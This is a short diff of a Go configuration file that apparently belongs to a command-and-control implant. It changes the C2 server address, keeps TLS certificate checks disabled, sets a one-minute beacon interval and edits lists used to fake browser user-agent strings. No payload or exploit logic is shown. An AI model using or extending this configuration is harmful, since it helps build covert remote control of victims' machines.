@@ -7,7 +7,7 @@ import (
 )
 
 var (
-	C2                      = [...]string{"https://192.168.1.73:8080/"}
+	C2                      = [...]string{"https://10.37.129.2:8080/"}
 	InsecureSkipVerify bool = true
 
 	PingTime  int    = 1 //minutes
@@ -64,7 +64,7 @@ var (
 
 	A       = []string{"Macintosh", "Windows", "X11"}
 	B       = []string{"68K", "PPC", "Intel Mac OS X"}
-	C       = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
+	CC      = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	D       = []string{"Linux i686", "Linux x86_64"}
 	E       = []string{"chrome", "spider", "ie"}
 	F       = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
